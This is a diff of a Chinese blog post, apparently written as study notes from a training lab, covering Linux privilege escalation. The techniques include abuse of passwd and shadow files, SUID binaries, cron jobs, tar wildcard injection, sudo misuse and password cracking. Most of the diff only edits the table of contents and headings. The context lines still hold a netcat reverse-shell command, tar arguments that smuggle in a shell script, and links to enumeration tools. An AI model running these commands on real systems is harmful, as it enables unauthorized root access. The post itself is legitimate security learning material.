@@ -1,18 +1,15 @@
-I"ӡ<p>上次在实验楼看到一个关于linux提权的训练营，写的非常好，不过过了一段时间忘得也差不多了，这次就趁着楼赛再复习一遍吧。</p>
-
-<p>Linux 常用的提权方法如下：</p>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">passwd/shadow</code> 文件提权</li>
-  <li><code class="language-plaintext highlighter-rouge">SUID</code> 可执行文件提权</li>
-  <li><code class="language-plaintext highlighter-rouge">Cron Jobs</code> 定时任务提权</li>
-  <li>通配符注入提权</li>
-  <li><code class="language-plaintext highlighter-rouge">sudo</code> 滥用提权</li>
-  <li>敏感文件提权</li>
-  <li>跳板用户提权</li>
-  <li><code class="language-plaintext highlighter-rouge">Linux</code> 内核漏洞提权</li>
-  <li>暴力破解提权</li>
-</ul>
+I"o�<p>上次在实验楼看到一个关于linux提权的训练营，写的非常好，不过过了一段时间忘得也差不多了，这次就趁着楼赛再复习一遍吧。<br />
+ 		 <a href="#一-passwd文件提权"><strong>一.<code class="language-plaintext highlighter-rouge">passwd</code> 文件提权</strong></a><br />
+ 		 <a href="#二-shadow文件提权"><strong>二.<code class="language-plaintext highlighter-rouge">shadow</code> 文件提权</strong></a><br />
+		 <a href="#三-suid提权"><strong>三.<code class="language-plaintext highlighter-rouge">SUID</code> 可执行文件提权</strong></a><br />
+		 <a href="#四-cronjobs提权"><strong>四.<code class="language-plaintext highlighter-rouge">Cron Jobs</code> 定时任务提权</strong></a><br />
+		 <a href="#五-通配符注入提权"><strong>五.通配符注入提权</strong></a><br />
+		 <a href="#六-sudo提权"><strong>六.<code class="language-plaintext highlighter-rouge">sudo</code> 滥用提权</strong></a><br />
+		 <a href="#七-查找敏感文件提权"><strong>七.敏感文件提权</strong></a><br />
+		 <a href="#八-跳板用户提权"><strong>八.跳板用户提权</strong></a><br />
+		 <a href="#九-内核漏洞提权"><strong>九.<code class="language-plaintext highlighter-rouge">Linux</code> 内核漏洞提权</strong></a><br />
+		 <a href="#十-暴力破解提权"><strong>十.暴力破解提权</strong></a><br />
+		 <a href="#十一-自动化提权工具"><strong>十一.自动化提权</strong></a></p>
 
 <h3 id="预备将垃圾shell升级成具有交互功能的shell">预备：将垃圾shell升级成具有交互功能的shell</h3>
 
@@ -61,7 +58,7 @@
 
 <p>这种方式反弹回的 shell 最为完整，但需要目标主机支持 <code class="language-plaintext highlighter-rouge">socat</code> 工具。</p>
 
-<h3 id="一-passwd-文件提权">一. passwd 文件提权</h3>
+<h3 id="一-passwd文件提权">一. passwd文件提权</h3>
 
 <p>通常来说，通过 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 提权的方法有两种：</p>
 
@@ -133,7 +130,7 @@
 
 <p>john 工具对于同一个破解文件中的同一条 hash 记录只会爆破一次，如果第二次执行 <code class="language-plaintext highlighter-rouge">john ~/hash.txt</code> 是不会得到结果的，如果想查看上一次爆破的结果，需要使用 <code class="language-plaintext highlighter-rouge">--show</code> 参数</p>
 
-<h3 id="二-shadow-文件提权">二. shadow 文件提权</h3>
+<h3 id="二-shadow文件提权">二. shadow文件提权</h3>
 
 <p><code class="language-plaintext highlighter-rouge">/etc/shadow</code> 文件用于存储<strong>加密后的密码</strong>和密码相关的配置信息，该文件的每一行代表一个用户，每行都包含 9 个字段，用冒号(“:”)隔开，顺序如下：</p>
 
@@ -277,7 +274,7 @@
 
 <p>至此，我们成功提权到 root 用户。</p>
 
-<h3 id="三-suid-提权">三. SUID 提权</h3>
+<h3 id="三-suid提权">三. SUID提权</h3>
 
 <p>通常情况下，Linux 运行一个程序，是使用当前运行这个程序的用户权限，这种机制是非常合理的，但有一些程序比较特殊，比如我们常用的 <code class="language-plaintext highlighter-rouge">ping</code> 命令。</p>
 
@@ -463,7 +460,7 @@ find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span cl
 
 <p>实际上可通过 SUID 提权的命令远不止这三种，例如 <code class="language-plaintext highlighter-rouge">cat、vim、more、sed</code> 等命令也都可以进行 SUID 提权，但只要你掌握实验中提到的<strong>提权思路</strong>，其他命令也就能融会贯通了。</p>
 
-<h3 id="四-cron-jobs-提权">四. Cron Jobs 提权</h3>
+<h3 id="四-cronjobs提权">四. CronJobs提权</h3>
 
 <h4 id="1什么是-cron-定时任务">1.什么是 Cron 定时任务</h4>
 
@@ -759,7 +756,7 @@ nc 127.0.0.1 4444 <span class="nt">-e</span> /bin/bash
 
 <p>这种情况下<code class="language-plaintext highlighter-rouge">/var/www/html/--checkpoint=1</code>和 <code class="language-plaintext highlighter-rouge">/var/www/html/--checkpoint-action=exec=sh shell.sh</code>就不会被 shell 解释为 tar 命令参数，所以无法注入成功。</p>
 
-<h3 id="六-sudo-提权">六. sudo 提权</h3>
+<h3 id="六-sudo提权">六. sudo提权</h3>
 
 <h4 id="1什么是-sudo-权限">1.什么是 sudo 权限</h4>
 
@@ -1657,4 +1654,5 @@ python3 <span class="nt">-m</span> http.server 8000
   <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS</a></li>
   <li><a href="https://github.com/AlessandroZ/BeRoot/tree/master/Linux">BeRoot</a></li>
 </ul>
+
 :ET
